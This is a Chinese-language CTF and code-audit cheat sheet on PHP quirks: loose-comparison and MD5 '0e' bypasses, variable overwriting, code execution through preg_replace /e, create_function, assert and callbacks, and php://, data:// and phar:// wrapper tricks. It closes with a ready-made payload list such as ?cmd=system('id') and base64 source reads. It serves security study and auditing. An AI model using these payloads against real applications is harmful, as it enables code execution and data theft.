# PHP 特性利用模块

## 适用场景
- PHP 代码审计
- 弱类型比较漏洞
- 变量覆盖、函数特性利用

## 检查清单

```yaml
弱类型:
  - [ ] == 和 === 的区别
  - [ ] 字符串与数字比较
  - [ ] 数组与字符串比较
  - [ ] MD5/SHA1 比较
  - [ ] JSON 类型转换

变量覆盖:
  - [ ] extract()
  - [ ] parse_str()
  - [ ] $$变量变量
  - [ ] import_request_variables()
  - [ ] register_globals

函数特性:
  - [ ] preg_replace /e
  - [ ] create_function()
  - [ ] array_map/array_filter
  - [ ] usort/uasort
  - [ ] call_user_func()
  - [ ] assert()

伪协议:
  - [ ] php://filter
  - [ ] php://input
  - [ ] data://
  - [ ] phar://

其他特性:
  - [ ] 正则回溯限制
  - [ ] 变量传递
  - [ ] 序列化特性
```

## 弱类型比较

### 1. == 与 === 的区别

```php
// == 会进行类型转换
// === 严格比较，类型和值都相同

"0" == 0      // true
"0" === 0     // false
"admin" == 0  // true
"1admin" == 1 // true

// CTF 常见绕过
$password == "admin"
// 传入 password=0 即可绕过（如果 "admin" 被转为数字会是 0）
```

### 2. 字符串与数字比较

```php
// 字符串开头是数字
"123abc" == 123  // true
"1e2" == 100     // true (科学计数法)
"0e123" == 0     // true

// 字符串开头不是数字
"admin" == 0     // true
"abc" == 0       // true

// 利用场景
if ($input == 123) {
    // 传入 input=123abc 可绕过
}
```

### 3. MD5 比较绕过

```php
// 场景1: MD5 弱比较
if (md5($_GET['a']) == md5($_GET['b'])) {
    // 使用 0e 开头的 MD5
}

// 0e 开头的字符串 (PHP 认为是科学计数法，值为 0)
QNKCDZO  -> 0e830400451993494058024219903391
240610708 -> 0e462097431906509019562988736854
s878926199a -> 0e545993274517709034328855841020
s155964671a -> 0e342768416822451524974117254469
s214587387a -> 0e848240448830537924465865611904

// 场景2: MD5 强比较 (===)
if (md5($_GET['a']) === md5($_GET['b'])) {
    // 使用数组绕过
    // md5(array) 返回 NULL
}
?a[]=1&b[]=2

// 场景3: 真正的碰撞
// 使用 fastcoll 生成 MD5 碰撞
```

### 4. SHA1 比较绕过

```php
// 与 MD5 类似
// 数组绕过
if (sha1($_GET['a']) === sha1($_GET['b'])) {
    // ?a[]=1&b[]=2
}

// 0e 开头的 SHA1 (较少)
aaroZmOk -> 0e66507019969427134894567494305185566735
```

### 5. strcmp 绕过

```php
// strcmp 比较字符串
// strcmp(array, string) 返回 NULL
// NULL == 0 为 true

if (strcmp($_GET['password'], 'admin') == 0) {
    // ?password[]=xxx 可绕过
}

// PHP 7+ 改为返回 false
```

### 6. in_array 绕过

```php
// 默认使用松散比较
if (in_array($_GET['num'], array(1, 2, 3))) {
    // ?num=1abc 可绕过
}

// 安全写法需要第三个参数为 true
in_array($_GET['num'], array(1, 2, 3), true);
```

### 7. switch 绕过

```php
// switch 使用松散比较
switch ($_GET['type']) {
    case 1:
        // ?type=1abc 可匹配
        break;
}
```

### 8. intval 特性

```php
// intval 只取整数部分
intval("123abc") -> 123
intval("abc123") -> 0
intval("1e2") -> 1 (不是100!)
intval("0x1a") -> 0 (PHP 5.x 是 26)

// 绕过场景
if (intval($_GET['num']) < 2020 && $_GET['num'] > 2020) {
    // ?num=2021e0 可绕过
    // intval("2021e0") = 2021 > 2020 但字符串比较 "2021e0" 会是 2021
}
```

## 变量覆盖

### 1. extract() 漏洞

```php
// extract 将数组转为变量
$auth = false;
extract($_GET);
if ($auth) {
    // ?auth=1 可绕过
}

// 绕过密码验证
$password = "secret";
extract($_POST);
if ($password === "secret") {
    // POST: password=xxx 覆盖
}
```

### 2. parse_str() 漏洞

```php
// parse_str 解析查询字符串为变量
$auth = false;
parse_str($_SERVER['QUERY_STRING']);
if ($auth) {
    // ?auth=1 可绕过
}
```

### 3. $$ 变量变量

```php
// 动态变量名
foreach ($_GET as $key => $value) {
    $$key = $value;
}
// ?password=xxx 可覆盖 $password
```

## 函数特性利用

### 1. preg_replace /e 修饰符 (PHP < 7.0)

```php
// /e 修饰符导致代码执行
preg_replace('/test/e', 'phpinfo()', 'test');

// 利用
preg_replace('/(.*)/e', 'strtolower("\\1")', $_GET['cmd']);
// ?cmd=${phpinfo()}
// ?cmd=${system(id)}
```

### 2. create_function() (PHP < 7.2)

```php
// create_function 等同于 eval
$func = create_function('$a', 'return $a;');
// 相当于
// function lambda_xxx($a) { return $a; }

// 利用 - 注入代码
$func = create_function('$a', 'return $a;}phpinfo();//');
// 相当于
// function lambda_xxx($a) { return $a;}phpinfo();// }

// CTF 场景
$func = create_function('', $_GET['code']);
// ?code=}phpinfo();//
```

### 3. array_map / array_filter

```php
// 回调函数可控
$arr = array($_GET['cmd']);
array_map('system', $arr);
// ?cmd=id

// array_filter
array_filter(array($_GET['cmd']), 'system');
```

### 4. usort / uasort

```php
// 排序函数回调
usort(...$_GET);
// ?0[0]=id&0[1]=system&1=1

// uasort
$arr = array($_GET['cmd']);
uasort($arr, 'system');
```

### 5. call_user_func / call_user_func_array

```php
// 回调函数调用
call_user_func($_GET['func'], $_GET['arg']);
// ?func=system&arg=id

call_user_func_array($_GET['func'], array($_GET['arg']));
```

### 6. assert() (PHP < 7.2)

```php
// assert 可执行代码
assert($_GET['cmd']);
// ?cmd=system('id')

// PHP 7+ assert 变为语言结构，不再接受字符串
```

## 伪协议利用

### 1. php://filter

```php
// 读取源码
php://filter/read=convert.base64-encode/resource=index.php

// 写入文件
php://filter/write=convert.base64-decode/resource=shell.php

// 绕过过滤
php://filter/convert.iconv.utf-8.utf-16/convert.base64-encode/resource=index.php
```

### 2. php://input

```php
// 获取原始 POST 数据
include('php://input');
// POST: <?php phpinfo(); ?>

// 条件: allow_url_include=On
```

### 3. data://

```php
// 数据流
include('data://text/plain,<?php phpinfo(); ?>');
include('data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==');

// 条件: allow_url_include=On
```

### 4. phar://

```php
// 读取 phar 包内文件
include('phar://test.phar/test.php');
include('phar://test.jpg/test.php');

// 配合反序列化
// phar 的 metadata 会被反序列化
```

## 正则回溯限制

```php
// PHP 正则有回溯次数限制
// pcre.backtrack_limit = 1000000

// 利用场景
if (preg_match('/^.+$/s', $_GET['cmd'])) {
    eval($_GET['cmd']);
}

// 超过限制后返回 false
?cmd=AAAAAA...(超过100万个A)...;phpinfo();
```

## 数组相关

```php
// is_numeric 绕过
is_numeric(array()) -> false
// 传入数组可绕过 is_numeric 检查

// 数组转字符串
$arr = array('a', 'b');
echo $arr;  // "Array"
// 某些函数期望字符串时传数组

// array_search 松散比较
array_search(0, array('admin', 'guest')) -> 0 (找到 'admin')
array_search('admin', array(0, 1)) -> 0 (找到 0)
```

## 常见套路与解法

### 套路 1: MD5 弱比较

```php
if ($_GET['a'] != $_GET['b'] && md5($_GET['a']) == md5($_GET['b']))
```

**解法**:
```
?a=QNKCDZO&b=s878926199a
```

### 套路 2: MD5 强比较

```php
if ($_GET['a'] !== $_GET['b'] && md5($_GET['a']) === md5($_GET['b']))
```

**解法**:
```
?a[]=1&b[]=2
```

### 套路 3: 数字绕过

```php
if ($_GET['num'] != 2020 && intval($_GET['num']) == 2020)
```

**解法**:
```
?num=2020a
?num=2020.1
```

### 套路 4: json 弱类型

```php
$data = json_decode($_GET['json'], true);
if ($data['password'] == $admin_password)
```

**解法**:
```
?json={"password": 0}
// 整数 0 与任意非数字开头字符串相等
```

### 套路 5: 科学计数法

```php
if ($_GET['num'] > 999999999)
```

**解法**:
```
?num=1e10
?num=1e999999999
```

## 常用 Payload

```php
// 获取 phpinfo
?cmd=${phpinfo()}
?cmd=phpinfo();

// 系统命令
?cmd=system('id');
?func=system&arg=id

// 读取文件
?file=php://filter/read=convert.base64-encode/resource=flag.php

// 数组绕过
?a[]=1&b[]=2

// 0e MD5
?password=QNKCDZO
```

## 工具速查

```bash
# MD5 碰撞
fastcoll -o a b

# 在线 PHP 运行
# https://onlinephp.io/
# https://3v4l.org/

# 参考资料
# https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Type%20Juggling
```
